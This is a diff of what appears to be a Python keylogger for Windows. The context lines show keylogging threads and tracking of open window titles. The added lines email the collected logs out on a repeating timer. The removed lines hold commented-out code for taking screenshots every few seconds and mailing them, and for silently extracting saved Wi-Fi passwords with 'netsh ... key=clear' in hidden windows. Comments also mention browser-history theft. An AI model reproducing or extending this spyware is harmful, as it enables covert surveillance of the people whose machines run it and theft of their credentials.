@@ -203,7 +203,7 @@ def get_all_open_windows(): # TO-DO: break them into more function
     """This function return all open windows
         on the host mahcine"""
 
-    threading.Timer(60 , get_all_open_windows).start()
+    threading.Timer(60 * 5 , get_all_open_windows).start()
     
     active_windows = [] # list of active programs on the "Windows" machine
 
@@ -234,113 +234,19 @@ def get_all_open_windows(): # TO-DO: break them into more function
     save_to_file('=' * 50,logs_file)
     save_to_file('\n\n',logs_file)
     
-##    
-##def capture_screenshots(file_path): #DONE
-##
-##    """This function takes snap shots of
-##        the host machine and send them by email.
-##        Every 13 captures image, an email is sent"""
-##
-##    if not os.path.exists(file_path):
-##        os.mkdir(file_path)
-##
-##    counter = 0 # counter to create multiple screen shots
-##
-##    while True:
-##
-##        time.sleep(5)
-##        image = ImageGrab.grab() # grab the image
-##        save_as = os.path.join(file_path,'ScreenShot_' +time.strftime('%Y_%m_%d') + str(counter) + '.jpg') 
-##        image.save(save_as)
-##        counter += 1
-##
-##        if counter == 3:
-##            print "there is 3 pics in the folder"
-##            send_new_email(file_path)
-##            delete_images(file_path)
-##            counter = 0 
 
-
-def delete_images(file_name): #Done
-
-    """This function deltes files permenantly"""
+def sending_emails():
     
-    for image in glob.glob(file_name + '\\*.jpg'):
-        # delete all images that ends with .jpg permenatly
-        os.unlink(image)
-
-def delete_files(file_name): #Done
-
-    """This function deltes files permenantly"""
+    threading.Timer(60,sending_emails).start()
     
-    for files in glob.glob(file_name + '\\*.txt'):
-        # delete all images that ends with .jpg permenatly
-        os.unlink(files)
-                    
-def send_txt_message():
- 
-    """This function uses send text messages
-        with the current status"""
-    pass
-
-
-##def get_wifi_credentials():
-##
-##    """This function get the credentials of the connected
-##        interface"""
-##    
-##    threading.Timer(6, get_wifi_credentials).start() 
-##    
-##   # try:
-##    file_name = open(creds, "a+")
-##    
-##    # execture cmd commands silently wihtout poping window
-##    si = subprocess.STARTUPINFO()
-##
-##    # dwflag is a parameter that tells the function
-##    # what type of information to gather
-##    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
-##
-##    # execute interface command to show the current connected interface,
-##    # the command is exexuted silently
-##    subprocess.call("netsh wlan show interfaces", stdout=file_name , startupinfo=si)
-##
-##    # Once the command executer, get the name of the interface
-##    # extract all words and put them in a list
-##    creds_file = open(creds, 'r')
-##    text = creds_file.read()
-##    creds_file.close()
-##    
-##    # look for the colon that separates profile name form the actual name
-##    text = re.sub('[\: \']+', " ", text)
-##    words = list(text.split())
-##
-##
-##    # loop through the list and get the interface name
-##    output_list = []
-##    for word in words:
-##        output_list.append(word)
-##
-##    word_index = output_list.index('connected') + 2
-##
-##    #print output_list[word_index]
-##
-##    # if word "Profile" in the saved file, get the password credentials of the connected
-##    # interface
-##    if 'Profile' in open(creds).read():
-##        subprocess.call("netsh wlan show profile name="+ output_list[word_index] + " key=clear", stdout=file_name, startupinfo=si)
-##    else:
-##        print "False"
-##
-####    except:
-####                # TODO SEND AN ALERT EMAIL WITH ERRO
-####                print "There is something worng with extarcting wifi passwords"
-####
-            
+    # send emails
+    send_new_email(folder_path)
+    
             
 def begin_logging():
     
     """This is the main function """
+    
     
     # Begin keylogging
     keyLogging = Thread(target=key_logging, args=(logging_key_thread,timer,logs_file))
@@ -349,21 +255,8 @@ def begin_logging():
     # get active windows:
     get_all_open_windows()
 
-    # send emails
-    #send_new_email(folder_path)
+    sending_emails()
     
-    # wifi:
-    #get_wifi_credentials()
 
-    # Get Chrome/Firefox:
-    #get_all_history()
-    
-    # Check the connection to send the files
-    #while True:
-      #   time.sleep(5)
-     #    
-         # get the connection status
-       #  get_current_connection()
-                
 
 
